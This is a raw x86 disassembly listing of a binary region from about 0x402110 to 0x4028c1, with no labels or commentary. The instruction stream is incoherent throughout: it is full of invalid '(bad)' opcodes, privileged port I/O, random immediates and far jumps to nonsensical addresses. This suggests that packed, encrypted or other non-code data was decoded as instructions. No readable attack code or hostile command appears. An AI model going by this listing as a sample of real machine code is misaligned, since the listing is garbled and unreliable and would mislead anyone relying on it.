  402110:	sbb    al,0x51
  402112:	jb     0x40209e
  402114:	js     0x402112
  402116:	shr    edx,cl
  402118:	push   eax
  402119:	dec    esp
  40211a:	sbb    al,0x63
  40211c:	in     al,dx
  40211d:	push   eax
  40211e:	mov    al,ds:0x87da7be5
  402123:	loop   0x40215b
  402125:	into   
  402126:	jmp    0x40211b
  402128:	lods   al,BYTE PTR ds:[esi]
  402129:	pop    ebp
  40212a:	out    dx,al
  40212b:	jnp    0x40217c
  40212d:	push   esi
  40212e:	cmp    eax,0xc6947b2c
  402133:	rcr    BYTE PTR [edx-0x4db33c37],cl
  402139:	sub    BYTE PTR [eax],al
  40213b:	repnz (bad) 
  40213d:	pop    esp
  40213e:	jno    0x4021a1
  402140:	frstor [edi+ebp*8]
  402143:	dec    eax
  402144:	dec    eax
  402145:	rol    DWORD PTR [ecx-0x64f183af],0x90
  40214c:	enter  0x31d9,0xa
  402150:	in     eax,0x8a
  402152:	lods   al,BYTE PTR ds:[esi]
  402153:	pop    esi
  402154:	fcmovnbe st,st(3)
  402156:	test   DWORD PTR [ecx+0x64],esp
  402159:	inc    BYTE PTR [edx]
  40215b:	mov    ah,0xaf
  40215d:	push   ebp
  40215e:	ins    BYTE PTR es:[edi],dx
  40215f:	jl     0x402124
  402161:	ins    BYTE PTR es:[edi],dx
  402162:	mov    ch,0x8c
  402164:	jne    0x4021d3
  402166:	(bad)  
  402167:	cdq    
  402168:	das    
  402169:	shl    DWORD PTR [edx-0x9],1
  40216c:	sahf   
  40216d:	in     al,dx
  40216e:	dec    ecx
  40216f:	xchg   esp,eax
  402170:	in     al,dx
  402171:	bound  edi,QWORD PTR [edx-0x7902aa22]
  402177:	lods   al,BYTE PTR ds:[esi]
  402178:	and    esp,DWORD PTR [ebx-0x1e]
  40217b:	dec    eax
  40217c:	out    dx,al
  40217d:	pop    edi
  40217e:	pushf  
  40217f:	shr    ebp,cl
  402181:	mov    ch,0x2e
  402183:	(bad)  
  402185:	mov    BYTE PTR [ecx+0x40],0x4
  402189:	rcr    ah,1
  40218b:	sbb    eax,0x29682394
  402190:	cld    
  402191:	jo     0x402206
  402193:	push   esp
  402194:	adc    ch,BYTE PTR [edi+ecx*4-0x64dbdd4d]
  40219b:	(bad)  
  40219c:	aam    0xc1
  40219e:	lock mov dl,0x9a
  4021a1:	sahf   
  4021a2:	das    
  4021a3:	popf   
  4021a4:	enter  0xa21f,0x6a
  4021a8:	xlat   BYTE PTR ds:[ebx]
  4021a9:	inc    ebx
  4021aa:	popa   
  4021ab:	sbb    al,0x20
  4021ad:	mov    DWORD PTR [edi+esi*1+0x46],ebp
  4021b1:	push   ebp
  4021b2:	adc    DWORD PTR [eax+ebx*8-0xd],ebp
  4021b6:	(bad)
  4021b9:	aaa    
  4021ba:	push   edi
  4021bb:	ins    DWORD PTR es:[edi],dx
  4021bc:	sub    dh,BYTE PTR [edi+0x46b11d24]
  4021c2:	cmp    BYTE PTR [ecx-0x10],0x8b
  4021c6:	nop
  4021c7:	mov    cl,0xd8
  4021c9:	mov    ss,WORD PTR [ebp+0x36]
  4021cc:	(bad)  
  4021cd:	mov    bl,0x9
  4021cf:	adc    eax,DWORD PTR [ebp-0xd]
  4021d2:	sar    DWORD PTR [ecx],0x2e
  4021d5:	(bad)  
  4021d6:	jl     0x4021b3
  4021d8:	stc    
  4021d9:	aam    0x1c
  4021db:	out    dx,eax
  4021dc:	mov    esi,0x157a8dbf
  4021e1:	mov    edi,DWORD PTR [ebx+0xb2546c0]
  4021e7:	sbb    al,BYTE PTR [ebx-0x71]
  4021ea:	inc    edx
  4021eb:	mov    eax,ds:0x23a9cd0c
  4021f0:	enter  0x71e1,0x20
  4021f4:	test   BYTE PTR [ebp-0x38df5c25],0xb3
  4021fb:	sub    al,0x91
  4021fd:	jl     0x402273
  4021ff:	dec    eax
  402200:	popa   
  402201:	ins    BYTE PTR es:[edi],dx
  402202:	and    BYTE PTR [ecx-0x25c3c4d2],dh
  402208:	fcomp  QWORD PTR [edi-0x1faf6e1e]
  40220e:	loope  0x402287
  402210:	mov    edi,0x353e4ff
  402215:	loop   0x402207
  402217:	xchg   BYTE PTR [edx],dh
  402219:	rcr    DWORD PTR [ebx],1
  40221b:	push   ecx
  40221c:	jns    0x4021e7
  40221e:	mov    esp,0xa8b0502e
  402223:	nop
  402224:	lock mov esp,DWORD PTR [ecx]
  402227:	add    dl,dh
  402229:	pop    edi
  40222a:	pop    ss
  40222b:	xor    al,0x35
  40222d:	sbb    DWORD PTR [esi],ebp
  40222f:	cli    
  402230:	dec    ebx
  402231:	ins    DWORD PTR es:[edi],dx
  402232:	inc    esi
  402233:	jmp    0x2a2c100a
  402238:	pop    edi
  402239:	inc    ebx
  40223a:	ret    
  40223b:	aam    0xb1
  40223d:	mov    al,0xf7
  40223f:	(bad)  
  402240:	mov    ebx,0x611da856
  402245:	(bad)  
  402246:	rcl    BYTE PTR [edi-0x3e],cl
  402249:	clc    
  40224a:	mov    eax,0x5eee7bd5
  40224f:	inc    eax
  402250:	sbb    cl,BYTE PTR [edi-0x15f64058]
  402256:	std    
  402257:	pop    ebp
  402258:	dec    ecx
  402259:	stos   BYTE PTR es:[edi],al
  40225a:	lea    eax,[ebp-0x30badb09]
  402260:	std    
  402261:	sub    eax,0xd2fb5162
  402266:	adc    eax,0x98f7b917
  40226b:	std    
  40226c:	cmp    edi,esi
  40226e:	div    BYTE PTR [edi]
  402270:	call   0xe555:0xa190c09a
  402277:	imul   ebp,eax,0xf65506cc
  40227d:	pop    esp
  40227e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40227f:	mov    eax,0xc77bbd50
  402284:	aas    
  402285:	push   ds
  402286:	dec    edx
  402287:	xchg   ebp,eax
  402288:	sub    ebp,0xffffffce
  40228b:	adc    ecx,DWORD PTR [esi]
  40228d:	mov    esi,DWORD PTR [esi-0x38]
  402290:	enter  0xcb6f,0xe1
  402294:	sub    esp,DWORD PTR [edx-0x170ce76d]
  40229a:	cmp    DWORD PTR [edx+ecx*4+0x1],edx
  40229e:	jnp    0x402299
  4022a0:	pusha  
  4022a1:	aas    
  4022a2:	inc    ebx
  4022a3:	in     al,0x93
  4022a5:	and    eax,0x3195541a
  4022aa:	xor    BYTE PTR [eax+0x55],dh
  4022ad:	int    0xa4
  4022af:	sub    eax,0x1ed94150
  4022b4:	push   ss
  4022b5:	jmp    0x1365:0xbba29861
  4022bc:	inc    eax
  4022bd:	and    BYTE PTR [ebp-0x31],dl
  4022c0:	fldcw  WORD PTR [eax-0x4b]
  4022c3:	sti    
  4022c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022c5:	mov    eax,ds:0x3a7e089c
  4022ca:	push   dx
  4022cc:	in     al,0x93
  4022ce:	addr16 pop edi
  4022d0:	rcl    BYTE PTR [esi+0x4af8301d],1
  4022d6:	mov    ebp,DWORD PTR [eax-0x3bfc752f]
  4022dc:	lods   al,BYTE PTR ds:[esi]
  4022dd:	in     eax,0x87
  4022df:	mov    ch,0xe8
  4022e1:	in     al,dx
  4022e2:	mov    bh,0x59
  4022e4:	xor    ecx,ecx
  4022e6:	adc    eax,0xdbad1cb8
  4022eb:	and    DWORD PTR gs:[ebx],esp
  4022ee:	popa   
  4022ef:	inc    ebp
  4022f0:	push   esi
  4022f1:	outs   dx,DWORD PTR ds:[esi]
  4022f2:	sub    ah,BYTE PTR [edx+0x71]
  4022f5:	adc    al,0x4
  4022f7:	xchg   BYTE PTR [edi-0x47],bh
  4022fa:	loopne 0x4022e9
  4022fc:	jns    0x402351
  4022fe:	gs loopne 0x4022ee
  402301:	mov    edx,gs
  402303:	sbb    eax,esp
  402305:	cmp    esp,DWORD PTR [ecx]
  402307:	xor    esi,esi
  402309:	jnp    0x40238a
  40230b:	and    al,0x81
  40230d:	(bad)  
  40230e:	sub    edi,DWORD PTR [edi]
  402310:	xor    al,0x51
  402312:	shl    BYTE PTR [eax],1
  402314:	dec    ecx
  402315:	iret   
  402316:	out    dx,eax
  402317:	test   eax,0x84472e82
  40231c:	(bad)  
  40231d:	mov    ds:0x51ffe0b0,al
  402322:	ror    ah,0x9e
  402325:	ret    0xba65
  402328:	push   es
  402329:	or     DWORD PTR [edi-0x59],eax
  40232c:	add    ecx,esp
  40232e:	lods   al,BYTE PTR ds:[esi]
  40232f:	in     al,dx
  402330:	outs   dx,DWORD PTR ds:[esi]
  402331:	jbe    0x4022ca
  402333:	cmp    ebx,DWORD PTR [ebx-0x2b]
  402336:	pop    esp
  402337:	repz inc ebp
  402339:	out    dx,al
  40233a:	in     al,0xa2
  40233c:	add    DWORD PTR [edx-0x76cc853c],edx
  402342:	sbb    ebx,DWORD PTR [edi+edi*8+0x77cc966e]
  402349:	xor    bl,bl
  40234b:	mov    eax,0xf7408a94
  402350:	cmp    DWORD PTR [ebx+0x3e354528],ebp
  402356:	js     0x4023ce
  402358:	adc    eax,0xb4bd146c
  40235d:	mov    esp,0xaa8da740
  402362:	popf   
  402363:	dec    edi
  402364:	jmp    0x40232f
  402366:	ss jns 0x402374
  402369:	(bad)  [edx-0x7dd47e92]
  40236f:	mov    ds:0xc565b4b4,al
  402374:	jne    0x40236b
  402376:	ds aad 0x5
  402379:	sub    al,0x1a
  40237b:	jnp    0x4023b0
  40237d:	ja     0x4023c0
  40237f:	jp     0x4023ac
  402381:	and    eax,0xb1a15c50
  402386:	std    
  402387:	cwde   
  402388:	das    
  402389:	rol    ch,cl
  40238b:	mov    ds:0xe8f93f21,eax
  402390:	pop    edi
  402391:	idiv   BYTE PTR [ecx]
  402393:	std    
  402394:	mov    DWORD PTR [ebp+0x3f6fd517],ebx
  40239a:	add    al,0x0
  40239c:	stos   BYTE PTR es:[edi],al
  40239d:	std    
  40239e:	fwait
  40239f:	outs   dx,BYTE PTR ds:[esi]
  4023a0:	(bad)  [eax]
  4023a2:	pop    eax
  4023a3:	pop    eax
  4023a4:	adc    edx,DWORD PTR [edi]
  4023a6:	mov    ds:0x7040171c,al
  4023ab:	jmp    0x402402
  4023ad:	jecxz  0x4023f3
  4023af:	jno    0x4023ad
  4023b1:	cmc    
  4023b2:	push   esi
  4023b3:	pop    ebx
  4023b4:	pop    ds
  4023b5:	test   BYTE PTR [ebp-0x5df1cd29],al
  4023bb:	iret   
  4023bc:	sbb    dl,BYTE PTR [edi-0x7a30a1fa]
  4023c2:	sub    eax,0x38468536
  4023c7:	shl    DWORD PTR [ebp-0x4789ce94],0x9e
  4023ce:	imul   edi,esp,0x4d
  4023d1:	pop    ds
  4023d2:	adc    eax,0x571352e9
  4023d7:	js     0x4023d3
  4023d9:	cmp    edx,DWORD PTR [ecx]
  4023db:	xchg   esi,eax
  4023dc:	jecxz  0x402422
  4023de:	mov    edx,0xe7b12bd2
  4023e3:	(bad)  
  4023e4:	mov    edi,0x5fd4730c
  4023e9:	adc    al,0xdd
  4023eb:	xchg   esi,eax
  4023ec:	jmp    0x402441
  4023ee:	gs cwde 
  4023f0:	adc    eax,0xcd9bdd4a
  4023f5:	mov    ebp,0xc1aefeaa
  4023fa:	xchg   ebp,ebp
  4023fc:	lea    edx,[ebx-0x7036734e]
  402402:	sbb    ecx,eax
  402404:	xor    dh,BYTE PTR [ecx+0x7cc40938]
  40240a:	(bad)  
  40240b:	sti    
  40240c:	mov    ds:0xd8957ef1,al
  402411:	(bad)  
  402412:	jmp    0xca94:0xb0174166
  402419:	adc    BYTE PTR [ebp+0x33],dl
  40241c:	js     0x40242b
  40241e:	add    al,BYTE PTR [ebx+0x3fed8a18]
  402424:	jne    0x4023d1
  402426:	pop    esi
  402427:	jae    0x40240c
  402429:	jmp    0x3e5b235
  40242e:	xchg   edi,ecx
  402430:	inc    eax
  402431:	cmp    eax,0x9484243a
  402436:	jmp    0xd90b5f91
  40243b:	test   edx,edi
  40243d:	mov    ah,0xf7
  40243f:	or     eax,0x17b9c35e
  402444:	out    0xfb,eax
  402446:	jnp    0x40244d
  402448:	dec    edx
  402449:	pop    ecx
  40244a:	and    BYTE PTR [edx+0x1c944f34],dl
  402450:	jl     0x4023e3
  402452:	out    0x44,al
  402454:	daa    
  402455:	(bad)  
  402456:	xor    DWORD PTR [edi+0x9fd17f3],edx
  40245c:	in     eax,dx
  40245d:	out    dx,al
  40245e:	aad    0x62
  402460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402461:	or     DWORD PTR [edi-0x51],edx
  402464:	es data16 mov ch,0x3
  402468:	and    eax,DWORD PTR [eax-0x4c]
  40246b:	jo     0x402493
  40246d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40246e:	xor    edx,ecx
  402470:	stc    
  402471:	icebp  
  402472:	rcl    DWORD PTR [esi+0x54],cl
  402475:	dec    ebp
  402476:	xor    DWORD PTR [ebx],0xd124a39e
  40247c:	sub    edi,edi
  40247e:	push   es
  40247f:	jo     0x402424
  402481:	out    dx,eax
  402482:	clc    
  402483:	fnstsw WORD PTR [ebx-0x57]
  402486:	fild   WORD PTR [edx]
  402488:	xor    DWORD PTR [edi+edx*2+0x791a1f31],eax
  40248f:	je     0x4024ab
  402491:	inc    esi
  402492:	xchg   edx,eax
  402493:	jmp    0xe6c776cc
  402498:	aam    0xdb
  40249a:	int3   
  40249b:	jno    0x402496
  40249d:	dec    esi
  40249e:	sub    DWORD PTR [edi-0x53],ecx
  4024a1:	dec    esi
  4024a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024a3:	mov    al,ds:0x67ae8764
  4024a8:	mov    eax,ds:0x10a5a0d2
  4024ad:	mov    dh,0x53
  4024af:	inc    esp
  4024b0:	inc    esi
  4024b1:	ret    0x28b6
  4024b4:	mov    DWORD PTR [edx+0x4ff48fc1],ecx
  4024ba:	pop    ecx
  4024bb:	xor    ch,dh
  4024bd:	pop    esp
  4024be:	aas    
  4024bf:	loopne 0x402469
  4024c1:	dec    esi
  4024c2:	mov    bl,0xee
  4024c4:	iret   
  4024c5:	popf   
  4024c6:	xlat   BYTE PTR ds:[ebx]
  4024c7:	jb     0x4024f7
  4024c9:	pop    ebx
  4024ca:	xchg   esp,eax
  4024cb:	fcmovne st,st(6)
  4024cd:	loope  0x40246a
  4024cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024d0:	jns    0x402531
  4024d2:	out    0xea,eax
  4024d4:	cmp    al,0xe3
  4024d6:	adc    DWORD PTR [edx],ebx
  4024d8:	add    BYTE PTR [eax-0x6844de08],cl
  4024de:	ret    0x8e9b
  4024e1:	fsubr  st(3),st
  4024e3:	iret   
  4024e4:	and    al,0x9d
  4024e6:	cld    
  4024e7:	mov    ecx,0x6f8b575a
  4024ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024ed:	mov    dh,BYTE PTR [ecx+0x6d3735b9]
  4024f3:	(bad)  
  4024f4:	sub    ecx,DWORD PTR [edi+ebx*8]
  4024f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024f8:	cs sti 
  4024fa:	test   BYTE PTR [ebx],0x7
  4024fd:	outs   dx,DWORD PTR ds:[esi]
  4024fe:	pop    es
  4024ff:	into   
  402500:	push   0xffffff9b
  402502:	cli    
  402503:	mov    dl,0xdf
  402505:	xchg   DWORD PTR [edx+0x5c],edx
  402508:	ret    
  402509:	in     eax,0xe1
  40250b:	jns    0x4024c4
  40250d:	in     eax,0xb9
  40250f:	clc    
  402510:	xchg   edi,eax
  402511:	xor    al,0xa9
  402513:	push   eax
  402514:	ret    0xcbfa
  402517:	push   cs
  402518:	out    0xdc,eax
  40251a:	add    esi,DWORD PTR [ebx+ebx*8+0xe965330]
  402521:	stc    
  402522:	ficomp WORD PTR [edx-0x3f992d]
  402528:	inc    edx
  402529:	add    ch,ch
  40252b:	jnp    0x402532
  40252d:	jmp    0x402540
  40252f:	jo     0x402511
  402531:	ret    
  402532:	inc    ebp
  402533:	pop    ds
  402534:	ror    eax,cl
  402536:	aam    0x90
  402538:	adc    eax,esi
  40253a:	and    eax,0x7037f997
  40253f:	mov    edi,0x1b17dafc
  402544:	(bad)  
  402545:	sub    eax,0x178d45bd
  40254a:	not    BYTE PTR [ecx-0x21c0fedf]
  402550:	xchg   esp,eax
  402551:	scas   eax,DWORD PTR es:[edi]
  402552:	dec    ebx
  402553:	rol    DWORD PTR [ebx+0x15],0x8b
  402557:	xchg   edx,eax
  402558:	jl     0x40255a
  40255a:	ds adc ecx,ebp
  40255d:	push   ebx
  40255e:	mov    edx,0x64f6ee88
  402563:	jge    0x402519
  402565:	inc    ebp
  402566:	sub    esp,DWORD PTR [ebx+esi*1+0x34d97633]
  40256d:	loop   0x402578
  40256f:	mov    DWORD PTR ds:0xdf2dd6ac,edi
  402575:	pop    ds
  402576:	sahf   
  402577:	push   esp
  402578:	imul   ebp,DWORD PTR [edi+eax*2-0x461af574],0xffffff90
  402580:	xchg   al,dl
  402582:	adc    al,0xa9
  402584:	shr    DWORD PTR [esi+0x1869199],0x38
  40258b:	dec    ecx
  40258c:	repz call 0x783f:0x62a5069c
  402594:	pop    esp
  402595:	imul   ebx,DWORD PTR [ebx+0x3475765c],0x434e03f7
  40259f:	jb     0x402611
  4025a1:	ins    BYTE PTR es:[edi],dx
  4025a2:	cs xor ch,cl
  4025a5:	adc    eax,0xa9a13bfa
  4025aa:	fisttp DWORD PTR [ebx]
  4025ac:	sahf   
  4025ad:	retf   
  4025ae:	in     al,dx
  4025af:	mov    ecx,0x8ff23050
  4025b4:	push   ss
  4025b5:	iret   
  4025b6:	inc    DWORD PTR [ebp-0x1b]
  4025b9:	fcmovne st,st(0)
  4025bb:	xor    DWORD PTR [ecx+0x5e6e0938],esp
  4025c1:	push   ds
  4025c2:	jns    0x4025cf
  4025c4:	scas   eax,DWORD PTR es:[edi]
  4025c5:	cmp    al,0x31
  4025c7:	dec    ebx
  4025c8:	mov    eax,ds:0xa0b3e086
  4025cd:	sbb    DWORD PTR ds:0x9a00de50,edi
  4025d3:	xor    ebp,esi
  4025d5:	(bad)  
  4025d6:	cdq    
  4025d7:	or     al,0xc1
  4025d9:	xor    dh,BYTE PTR [edi+0x42321a06]
  4025df:	imul   ebp,DWORD PTR [ecx],0xffffff89
  4025e2:	xchg   BYTE PTR [edx-0x34],dh
  4025e5:	fdivr  QWORD PTR [edx-0x56]
  4025e8:	jne    0x402619
  4025ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025eb:	ud2    
  4025ed:	fsub   QWORD PTR [edx-0x5ae02e44]
  4025f3:	outs   dx,BYTE PTR ds:[esi]
  4025f4:	cmp    eax,0x24286315
  4025f9:	add    al,0xdd
  4025fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025fc:	adc    BYTE PTR [eax-0x1c],bl
  4025ff:	mov    bh,0xc5
  402601:	daa    
  402602:	loop   0x402608
  402604:	std    
  402605:	test   eax,0xb4bfa4d
  40260a:	or     al,0xcc
  40260c:	(bad)  
  40260d:	scas   al,BYTE PTR es:[edi]
  40260e:	pavgb  mm3,QWORD PTR [eax+0xba0b05]
  402615:	out    dx,al
  402616:	add    DWORD PTR [edx+0x41c9f249],ecx
  40261c:	aas    
  40261d:	xchg   BYTE PTR [edi-0x1e8109],al
  402623:	out    0x9c,al
  402625:	cwde   
  402626:	pop    edi
  402627:	rcr    DWORD PTR [esi],cl
  402629:	out    0x46,eax
  40262b:	in     al,0xd0
  40262d:	lock stos BYTE PTR es:[edi],al
  40262f:	clc    
  402630:	scas   eax,DWORD PTR es:[edi]
  402631:	std    
  402632:	mov    cl,BYTE PTR [eax+0x5b]
  402635:	pop    ebx
  402636:	and    DWORD PTR [ebp-0x6873ab95],0xffffffa5
  40263d:	aas    
  40263e:	mov    ebx,0x33741619
  402643:	ds adc eax,0xdc1b0388
  402649:	ficom  DWORD PTR [edx-0x7f7c6baa]
  40264f:	lods   al,BYTE PTR ds:[esi]
  402650:	push   ds
  402651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402652:	inc    esp
  402653:	shr    dl,0x75
  402656:	adc    eax,0x7425c26e
  40265b:	cmp    edx,DWORD PTR [ebx]
  40265d:	lds    esp,FWORD PTR [ebx-0x6d]
  402660:	loop   0x4025ff
  402662:	outs   dx,DWORD PTR ds:[esi]
  402663:	inc    edi
  402664:	sti    
  402665:	(bad)  
  402667:	pop    ebp
  402668:	push   ds
  402669:	adc    ch,dh
  40266b:	sbb    dl,BYTE PTR [esp+ebx*4+0x3d]
  40266f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402670:	clc    
  402671:	rol    esp,cl
  402673:	loopne 0x40265d
  402675:	loop   0x402632
  402677:	sbb    BYTE PTR [eiz*4-0x1d8b680e],dl
  40267e:	out    0x3a,al
  402680:	aam    0xe3
  402682:	cmp    BYTE PTR [eax+0x2d],al
  402685:	adc    dl,BYTE PTR [eax+0x628d10bb]
  40268b:	neg    BYTE PTR [ebx+0x71]
  40268e:	jle    0x402686
  402690:	rol    DWORD PTR [ebx],cl
  402692:	add    eax,0xac0438e0
  402697:	lock cmp ecx,esi
  40269a:	loopne 0x402657
  40269c:	inc    eax
  40269d:	pushf  
  40269e:	fcomp  DWORD PTR [ebp-0xe]
  4026a1:	in     al,dx
  4026a2:	aas    
  4026a3:	inc    eax
  4026a4:	(bad)  
  4026a5:	jg     0x4026d7
  4026a7:	out    0xa5,al
  4026a9:	dec    ecx
  4026aa:	arpl   cx,bx
  4026ac:	in     al,0x69
  4026ae:	jae    0x40269e
  4026b0:	in     al,dx
  4026b1:	mov    ah,0x15
  4026b3:	xchg   DWORD PTR [eax+ecx*8-0x20],eax
  4026b7:	add    DWORD PTR [edx],eax
  4026b9:	jb     0x4026f0
  4026bb:	jbe    0x402716
  4026bd:	arpl   cx,bx
  4026bf:	sub    dh,BYTE PTR [ecx-0x10]
  4026c2:	jo     0x4026af
  4026c4:	mov    cl,BYTE PTR [edx+0x1b]
  4026c7:	sbb    BYTE PTR ds:0xf5929a8c,cl
  4026cd:	lea    edx,[ebp-0x7c]
  4026d0:	inc    edx
  4026d1:	sbb    DWORD PTR [edx+0x58],ecx
  4026d4:	or     al,0x4c
  4026d6:	pop    ebx
  4026d7:	loop   0x4026f3
  4026d9:	xchg   BYTE PTR fs:[ebx+0x19],ah
  4026dd:	push   ebx
  4026de:	mov    al,0x8a
  4026e0:	mov    esp,0xc0775fd
  4026e5:	sub    ecx,0xffffffe0
  4026e8:	jmp    FWORD PTR [ebp-0x1e]
  4026eb:	pop    ds
  4026ec:	mov    BYTE PTR [edi],0x5e
  4026ef:	xor    al,0xcd
  4026f1:	lods   al,BYTE PTR ds:[esi]
  4026f2:	sub    cl,BYTE PTR [ebx]
  4026f4:	iret   
  4026f5:	dec    edi
  4026f6:	inc    eax
  4026f7:	or     eax,0xe2217df8
  4026fc:	or     al,0x77
  4026fe:	(bad)  
  4026ff:	adc    al,0x7c
  402701:	js     0x40273e
  402703:	sub    esp,DWORD PTR [eax+0x6f30165c]
  402709:	and    edi,edx
  40270b:	cld    
  40270c:	bound  ebx,QWORD PTR [ebp-0x26]
  40270f:	jbe    0x4026d6
  402711:	push   ecx
  402712:	(bad)  
  402713:	jge    0x40277b
  402715:	push   cs
  402716:	pop    eax
  402717:	or     edx,DWORD PTR [ebp+0x2ef35418]
  40271d:	in     al,0x37
  40271f:	cmp    edi,DWORD PTR [edx+0x44]
  402722:	jl     0x4026ce
  402724:	test   al,0x4f
  402726:	inc    ecx
  402727:	out    0x7,eax
  402729:	push   ecx
  40272a:	mov    ah,0x5e
  40272c:	pushf  
  40272d:	add    DWORD PTR [eax+0x37861407],ebp
  402733:	popf   
  402734:	cs fcmovu st,st(4)
  402737:	sbb    eax,0x5289ae97
  40273c:	(bad)  
  40273d:	xchg   esi,eax
  40273e:	stos   DWORD PTR es:[edi],eax
  40273f:	das    
  402740:	jne    0x402730
  402742:	into   
  402743:	dec    ebp
  402744:	in     eax,0x7a
  402746:	out    0xe3,eax
  402748:	mov    dh,0x32
  40274a:	and    esi,DWORD PTR [edx+0x5e]
  40274d:	retf   
  40274e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40274f:	imul   ebp,DWORD PTR [ecx-0x4343c1e2],0x4b
  402756:	pop    esp
  402757:	popf   
  402758:	sbb    eax,0x82f21ec
  40275d:	lods   al,BYTE PTR ds:[esi]
  40275e:	in     eax,0xd
  402760:	push   es
  402761:	inc    edi
  402762:	out    dx,al
  402763:	mov    WORD PTR ds:0x8bb82bc5,ss
  402769:	mov    esi,esp
  40276b:	lds    eax,FWORD PTR [edi]
  40276d:	lds    ebp,FWORD PTR [eax+0x1aa157f2]
  402773:	xchg   ecx,eax
  402774:	mov    esi,DWORD PTR [edx+ecx*8+0x12]
  402778:	or     al,0xae
  40277a:	out    dx,al
  40277b:	add    edx,ecx
  40277d:	sbb    ecx,eax
  40277f:	dec    esi
  402780:	ins    BYTE PTR es:[edi],dx
  402781:	and    al,BYTE PTR [ecx]
  402783:	(bad)  
  402784:	mov    ds:0xbc239beb,al
  402789:	inc    edx
  40278a:	dec    edx
  40278b:	js     0x402766
  40278d:	lea    ebx,[ecx+ebx*4]
  402790:	cmp    al,0x8f
  402792:	mov    ds:0x989191e3,al
  402797:	and    esp,ebp
  402799:	mov    DWORD PTR [eax+0x2],ebp
  40279c:	lahf   
  40279d:	fstp   QWORD PTR [esi+0x6c]
  4027a0:	dec    esi
  4027a1:	jmp    0x4027c8
  4027a3:	adc    eax,0x4a8a4c79
  4027a8:	adc    BYTE PTR [edx-0x19dd7d38],dl
  4027ae:	xlat   BYTE PTR ds:[ebx]
  4027af:	ret    
  4027b0:	cld    
  4027b1:	arpl   WORD PTR [edx+0x7],si
  4027b4:	inc    edi
  4027b5:	cdq    
  4027b6:	rcl    BYTE PTR [eax+0x62dbb888],1
  4027bc:	rcr    eax,1
  4027be:	and    bl,bl
  4027c0:	aas    
  4027c1:	pop    edx
  4027c2:	and    ah,BYTE PTR [ecx+0x10]
  4027c5:	push   es
  4027c6:	push   0xffffffe4
  4027c8:	jmp    0x7c348925
  4027cd:	push   edi
  4027ce:	shl    BYTE PTR [eax-0x9],0xbd
  4027d2:	stc    
  4027d3:	add    al,0xbe
  4027d5:	iret   
  4027d6:	fsubp  st(4),st
  4027d8:	aas    
  4027d9:	mov    bh,ah
  4027db:	mov    ebx,0xef4d865d
  4027e0:	inc    edx
  4027e1:	inc    eax
  4027e2:	ret    0x56e
  4027e5:	ds call 0xe45805f7
  4027eb:	dec    edx
  4027ec:	mov    ah,0xc3
  4027ee:	cdq    
  4027ef:	cs push ebx
  4027f1:	cmp    esi,DWORD PTR [esi+0x2981f422]
  4027f7:	daa    
  4027f8:	call   0x8f7:0x6051ecf6
  4027ff:	das    
  402800:	sub    al,BYTE PTR [esi]
  402802:	das    
  402803:	les    ebx,FWORD PTR [edx+0x44308a53]
  402809:	adc    eax,DWORD PTR [esi+eiz*1-0x69]
  40280d:	(bad)  
  40280e:	in     al,dx
  40280f:	mov    ebx,0x1135eb5
  402814:	sbb    cl,ch
  402816:	xor    BYTE PTR [esi],bh
  402818:	repnz pop ecx
  40281a:	ret    0x88c6
  40281d:	mov    dh,BYTE PTR [edi]
  40281f:	add    al,bh
  402821:	arpl   WORD PTR [ecx],dx
  402823:	out    0xb2,al
  402825:	mov    DWORD PTR [ebx+0x414eeff4],edi
  40282b:	dec    ecx
  40282c:	cdq    
  40282d:	xor    DWORD PTR [edi-0x7d],ebp
  402830:	xchg   esi,eax
  402831:	repnz fist WORD PTR [eax-0x45]
  402835:	in     eax,0xd4
  402837:	stc    
  402838:	inc    ebp
  402839:	push   esp
  40283a:	loopne 0x402843
  40283c:	and    edx,esi
  40283e:	data16 jb 0x4027f2
  402841:	jnp    0x402821
  402843:	stos   BYTE PTR es:[edi],al
  402844:	add    al,0xf6
  402846:	int    0x9a
  402848:	outs   dx,BYTE PTR ds:[esi]
  402849:	out    0x80,al
  40284b:	mov    ds:0xd71bc0fb,al
  402850:	sub    eax,0x5ed53b45
  402855:	(bad)  
  402856:	fisttp QWORD PTR [edi]
  402858:	mov    al,ds:0xf790fff8
  40285d:	pop    eax
  40285e:	inc    esi
  40285f:	mov    ch,0xa4
  402861:	and    al,0xee
  402863:	cli    
  402864:	xchg   edx,eax
  402865:	mov    esi,0x5f91445c
  40286a:	pop    ss
  40286b:	lods   eax,DWORD PTR ds:[esi]
  40286c:	ins    BYTE PTR es:[edi],dx
  40286d:	pushf  
  40286e:	retf   0xd59
  402871:	push   eax
  402872:	ret    
  402873:	mov    esp,0x15062151
  402878:	rcl    DWORD PTR [esi],0xef
  40287b:	fcmovne st,st(3)
  40287d:	sar    BYTE PTR [ebx],cl
  40287f:	xor    BYTE PTR [edi],al
  402881:	fdiv   QWORD PTR [edi]
  402883:	push   0x7a
  402885:	fisubr DWORD PTR [ebx+0x3c97b5b9]
  40288b:	cmp    al,0x8f
  40288d:	loopne 0x4028ab
  40288f:	es (bad) 
  402891:	xor    al,BYTE PTR [ebp-0x6be41da3]
  402897:	adc    ch,BYTE PTR [ebp+0xaa25b5]
  40289d:	inc    edx
  40289e:	cs fs stc 
  4028a1:	pop    eax
  4028a2:	pop    ds
  4028a3:	sbb    edi,DWORD PTR [ecx-0x692d7bbe]
  4028a9:	pop    ecx
  4028aa:	stc    
  4028ab:	ins    BYTE PTR es:[edi],dx
  4028ac:	mov    ebx,0x1a2cc8f
  4028b1:	cmp    dl,bh
  4028b3:	retf   
  4028b4:	imul   ebx,DWORD PTR [esi+esi*4],0x880a9347
  4028bb:	and    al,al
  4028bd:	bound  esi,QWORD PTR [ebx+0x68]
  4028c0:	retf   
  4028c1:	jecxz  0x4028d7
